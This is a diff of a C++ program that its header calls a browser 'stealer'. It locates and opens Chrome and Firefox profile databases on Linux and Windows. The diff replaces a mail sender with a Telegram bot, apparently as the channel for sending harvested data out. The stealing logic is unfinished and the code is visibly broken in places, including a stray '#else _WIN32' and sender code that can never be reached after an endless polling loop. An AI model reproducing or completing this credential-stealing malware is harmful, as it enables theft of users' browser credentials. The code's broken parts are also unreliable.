@@ -4,13 +4,20 @@
 // Description : stealer in C++
 //============================================================================
 
-#include "mailsender.h"
+#include "sender.h"
 #include <experimental/filesystem>
 #include <iostream>
 #include <string>
 #include <sstream>
+#include <exception>
+
+#include <csignal>
+#include <cstdio>
+#include <cstdlib>
+
 #include "sqlite3.h"
-//#include <curl/curl.h>
+#include <tgbot/tgbot.h>
+
 
 #ifdef _WIN32
     #include "windows/tools.h"
@@ -26,17 +33,14 @@
 
 namespace fs = std::experimental::filesystem;
 
-
-
 int main()
 {
     try
     {
+        sqlite3 *db;
 #ifdef __linux__
         std::string chrome_db_path = "~/.config/google-chrome/Default";
         std::string firefox_db_path = "~/.mozilla/firefox/<profilename>";
-
-        sqlite3 *db;
 
 #else _WIN32
         TCHAR username[255];
@@ -50,8 +54,6 @@ int main()
         String firefox_db_path = _T("C:\\Users\\");
         firefox_db_path += username;
         firefox_db_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
-
-        sqlite3 *db;
 #endif
 
         if( fs::exists(chrome_db_path))
@@ -81,8 +83,50 @@ int main()
         {
             std::cout << "ff exists" << std::endl;
         }
+
+    
+        std::string token("your_token");
+
+        TgBot::Bot bot(token);
+        bot.getEvents().onCommand("start", [&bot](TgBot::Message::Ptr message)
+        {
+            bot.getApi().sendMessage(message->chat->id, "Hi!");
+        });
+    
+        bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message)
+        {
+            printf("User wrote %s\n", message->text.c_str());
+        if (StringTools::startsWith(message->text, "/start"))
+            {
+                return;
+            }
+            bot.getApi().sendMessage(message->chat->id, "Your message is: " + message->text);
+        });
+    
+        signal(SIGINT, [](int s) 
+        {
+            printf("SIGINT got\n");
+            exit(0);
+        });
+
+        printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
+        bot.getApi().deleteWebhook();
+
+        TgBot::TgLongPoll longPoll(bot);
+        while (true) 
+        {
+            printf("Long poll started\n");
+            longPoll.start();
+        }
+        
+
+        Sender bot_sender(bot);
+        bot_sender.send("@chat_id", "Hello"); // chat_id is in format "@your_name"
     }
-    catch(...){}
+    catch(std::exception &e)
+    {
+        std::cerr << e.what();
+    }
 
     return 0;
 }
